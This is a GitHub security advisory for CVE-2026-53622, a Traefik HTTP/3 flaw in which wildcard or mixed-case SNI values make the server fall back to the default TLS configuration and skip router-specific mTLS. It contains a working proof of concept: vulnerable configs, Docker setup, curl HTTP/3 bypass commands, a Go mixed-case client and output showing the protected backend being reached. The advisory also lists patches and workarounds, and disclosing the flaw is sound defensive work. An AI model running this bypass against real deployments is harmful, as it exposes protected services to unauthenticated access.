# [H] Traefik: HTTP/3 mTLS bypass via exact SNI TLSOptions lookup for wildcard and mixed-case hosts

## Summary
Severity: High
Advisory: GHSA-9cr8-q42q-g8m7
CVE: CVE-2026-53622
CWE: CWE-288
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-9cr8-q42q-g8m7
Type: github-advisory

## Affected
- Go: `Traefik` — affected >=0 <3.7.3
- Go: `github.com/traefik/traefik/v2` — affected >=0
- Go: `github.com/traefik/traefik` — affected >=0

## Details
## Summary

There is a critical vulnerability in Traefik's HTTP/3 (QUIC) TLS configuration selection that allows unauthenticated clients to bypass router-specific mTLS enforcement. When HTTP/3 is enabled on an entrypoint, the TLS handshake selects the applicable TLS configuration through an exact, case-sensitive lookup on the SNI value, which fails to match wildcard host patterns (e.g., `*.example.com`) or case variants of the configured hostname. Because the handshake falls back to the default TLS configuration — which may not require client certificates — a client can complete the QUIC handshake without presenting a certificate, while the subsequent HTTP routing layer still dispatches the request to a backend protected by a router-specific mTLS policy. The issue affects deployments where HTTP/3 is enabled, a router uses a wildcard `Host` rule or case-insensitive hostname matching, a router-specific `TLSOptions` enforces client certificate authentication, and UDP access to the entrypoint is reachable by an attacker.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.7.3

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary

Traefik's HTTP/3 TLS configuration selection can ignore router-specific `TLSOptions` and allow unauthenticated clients to bypass mTLS. The QUIC/HTTP3 path resolves TLS configuration with `Router.GetTLSGetClientInfo()`, which performs a direct, case-sensitive map lookup on `hostHTTPTLSConfig[info.ServerName]`.

This is inconsistent with the later HTTP host routing semantics, where the same request host can still match wildcard or case-insensitive `Host` rules after the HTTP/3 TLS handshake has already fallen back to the default TLS configuration. Two exploit paths are confirmed:

1. `Host("*.example.com")` with `tls.options=mtls`: HTTP/2 requires a client certificate, but HTTP/3 reaches the protected backend without one.
2. `Host("api.example.com")` with `tls.options=mtls`: HTTP/2 requires a client certificate, but HTTP/3 with mixed-case SNI/Host such as `API.EXAMPLE.COM` reaches the protected backend without one.

Confirmed versions:

- wildcard HTTP/3 bypass: `v3.7.0`, `v3.7.1`
- exact-host mixed-case HTTP/3 bypass: `v3.6.17`, `v3.7.0`, `v3.7.1`

### Details

HTTP/3 installs a QUIC TLS callback in `pkg/server/server_entrypoint_tcp_http3.go`:

```go
h3.Server = &http3.Server{
    Addr:      config.GetAddress(),
    Port:      config.HTTP3.AdvertisedPort,
    Handler:   httpsServer.Server.(*http.Server).Handler,
    TLSConfig: &tls.Config{GetConfigForClient: h3.getGetConfigForClient},
}
```

The callback is wired to the TCP router's TLS selector:

```go
func (e *http3server) Switch(rt *tcprouter.Router) {
    e.lock.Lock()
    defer e.lock.Unlock()

    e.getter = rt.GetTLSGetClientInfo()
}
```

The selector in `pkg/server/router/tcp/router.go` only performs an exact map lookup:

```go
func (r *Router) GetTLSGetClientInfo() func(info *tls.ClientHelloInfo) (*tls.Config, error) {
    return func(info *tls.ClientHelloInfo) (*tls.Config, error) {
        if tlsConfig, ok := r.hostHTTPTLSConfig[info.ServerName]; ok {
            return tlsConfig, nil
        }

        return r.httpsTLSConfig, nil
    }
}
```

That creates two mismatches:

- wildcard keys such as `*.example.com` are never matched for `api.example.com`
- lower-case router keys such as `api.example.com` are not matched for mixed-case SNI such as `API.EXAMPLE.COM`

On the later HTTP request path, the same host can still match wildcard or case-insensitive `Host` rules through the muxer. The HTTP/3 TLS handshake path falls back to the default TLS config before that routing decision happens. If the default TLS config does not require a client certificate, the QUIC handshake succeeds without mTLS, and the later HTTP router still routes to the protected backend.

Preconditions:

- HTTP/3 is enabled on the affected entrypoint.
- A router-specific `TLSOptions` configuration enforces client certificate authentication.
- The default/fallback TLS configuration does not require client certificates.
- UDP access to the HTTP/3 entrypoint is reachable by the attacker.

Minimal wildcard dynamic configuration:

```yaml
http:
  routers:
    protected:
      rule: Host(`*.example.com`)
      service: protected
      tls:
        options: mtls

  services:
    protected:
      loadBalancer:
        servers:
          - url: http://protected:80

tls:
  certificates:
    - certFile: /certs/server.crt
      keyFile: /certs/server.key

  options:
    mtls:
      clientAuth:
        caFiles:
          - /certs/ca.crt
        clientAuthType: RequireAndVerifyClientCert
```

Minimal exact-host dynamic configuration:

```yaml
http:
  routers:
    protected:
      rule: Host(`api.example.com`)
      service: protected
      tls:
        options: mtls

  services:
    protected:
      loadBalancer:
        servers:
          - url: http://protected:80

tls:
  certificates:
    - certFile: /certs/server.crt
      keyFile: /certs/server.key

  options:
    mtls:
      clientAuth:
        caFiles:
          - /certs/ca.crt
        clientAuthType: RequireAndVerifyClientCert
```

Minimal Docker Compose:

```yaml
services:
  traefik:
    image: traefik:v3.7.1
    command:
      - --log.level=DEBUG
      - --entrypoints.websecure.address=:8443
      - --entrypoints.websecure.http3
      - --providers.file.filename=/etc/traefik/dynamic.yml
      - --providers.file.watch=false
    ports:
      - "8443:8443/tcp"
      - "8443:8443/udp"
    volumes:
      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro
      - ./certs:/certs:ro
    depends_on:
      - protected

  protected:
    image: traefik/whoami:v1.11
    command:
      - --name=PROTECTED
```

Certificate generation:

```bash
rm -rf certs
mkdir -p certs

openssl req -x509 -newkey rsa:2048 -nodes -days 7   -keyout certs/ca.key   -out certs/ca.crt   -subj "/CN=traefik-poc-ca"

openssl req -newkey rsa:2048 -nodes   -keyout certs/server.key   -out certs/server.csr   -subj "/CN=api.example.com"   -addext "subjectAltName=DNS:api.example.com,DNS:*.example.com"

openssl x509 -req   -in certs/server.csr   -CA certs/ca.crt   -CAkey certs/ca.key   -CAcreateserial   -out certs/server.crt   -days 7   -sha256   -copy_extensions copyall
```

The mixed-case HTTP/3 client used for the exact-host case:

```go
package main

import (
    "crypto/tls"
    "fmt"
    "io"
    "net/http"
    "os"
    "time"

    "github.com/quic-go/quic-go/http3"
)

func main() {
    serverName := os.Getenv("TLS_SERVER_NAME")
    if serverName == "" {
        serverName = "API.EXAMPLE.COM"
    }

    host := os.Getenv("HTTP_HOST")
    if host == "" {
        host = "API.EXAMPLE.COM"
    }

    tr := &http3.Transport{
        TLSClientConfig: &tls.Config{
            ServerName:         serverName,
            InsecureSkipVerify: true,
        },
    }
    defer tr.Close()

    client := &http.Client{Transport: tr, Timeout: 8 * time.Second}

    req, err := http.NewRequest(http.MethodGet, "https://127.0.0.1:8443/", nil)
    if err != nil {
        panic(err)
    }
    req.Host = host

    resp, err := client.Do(req)
    if err != nil {
        fmt.Fprintln(os.Stderr, err)
        os.Exit(1)
    }
    defer resp.Body.Close()

    fmt.Println(resp.Proto, resp.StatusCode)
    body, _ := io.ReadAll(resp.Body)
    fmt.Print(string(body))
}
```

### PoC

Wildcard bypass:

1. Start Traefik with the wildcard dynamic configuration above.
2. Control over TCP/TLS:

```bash
curl --noproxy '*' --http2 -skv   --resolve api.example.com:8443:127.0.0.1   https://api.example.com:8443/
```

Observed result:

```text
TLS alert ... certificate required
```

3. HTTP/3 bypass:

```bash
curl --noproxy '*' --http3-only -skv   --resolve api.example.com:8443:127.0.0.1   https://api.example.com:8443/
```

Observed result:

```text
HTTP/3 200
Name: PROTECTED
Host: api.example.com:8443
```

Exact-host mixed-case bypass:

1. Start Traefik with the exact-host dynamic configuration above.
2. Control over TCP/TLS:

```bash
curl --noproxy '*' --http2 -skv   --resolve api.example.com:8443:127.0.0.1   https://api.example.com:8443/
```

Observed result:

```text
TLS alert ... certificate required
```

3. Mixed-case HTTP/2 control:

```bash
curl --noproxy '*' --http2 -skv   --resolve API.EXAMPLE.COM:8443:127.0.0.1   https://API.EXAMPLE.COM:8443/
```

Observed result:

```text
TLS alert ... certificate required
```

This control confirms that the bypass is specific to the HTTP/3 TLS configuration selection path in this test setup. The HTTP/2 request to the same mixed-case hostname still fails with `certificate required`.

4. HTTP/3 bypass with the same mixed-case hostname:

```bash
TLS_SERVER_NAME=API.EXAMPLE.COM HTTP_HOST=API.EXAMPLE.COM   go run ./h3-case-client.go
```

Observed result:

```text
HTTP/3.0 200
Name: PROTECTED
Host: API.EXAMPLE.COM
```

Local regression tests used during validation:

```bash
go test ./pkg/server/router/tcp   -run 'TestGetTLSGetClientInfo_(WildcardCurrentBehavior|ExactHostCaseSensitivityCurrentBehavior)$'   -count=1
```

These tests were added locally during analysis to demonstrate the current behavior of `GetTLSGetClientInfo()`. They are not required to reproduce the issue; the Docker and `curl`/HTTP3 commands above are the end-to-end reproduction.

Version matrix observed with Docker images:

```text
wildcard H3 bypass: affected on v3.7.0 and v3.7.1
exact-case H3 bypass: affected on v3.6.17, v3.7.0, and v3.7.1
```

The wildcard case was tested on v3.7.x because wildcard `Host` / `HostSNI` matching and TLSOptions association for wildcard domains were introduced in v3.7.0.

### Impact

Deployments that use router `TLSOptions` as an access-control boundary for HTTP/3 can expose protected backends without client authentication.

The highest-impact case is mTLS:

- normal HTTP/2/TCP access to the protected host requires a client certificate
- HTTP/3 access to the same route falls back to the default TLS config
- the request is then routed to the protected backend without satisfying the route's mTLS policy

This can expose confidential data or privileged backend operations to unauthenticated network clients. The issue is especially severe because it does not require credentials, user interaction, or a prior foothold.

Possible workarounds until a fix is available:

- Disable HTTP/3 on entrypoints that rely on router-specific mTLS.
- Enforce mTLS in the default TLS options as well, so fallback TLS configuration is not weaker than router-specific configuration.
- Block UDP access to the HTTP/3 entrypoint.
- Enforce client authentication at an additional layer behind Traefik.

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-9cr8-q42q-g8m7
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v3.7.3
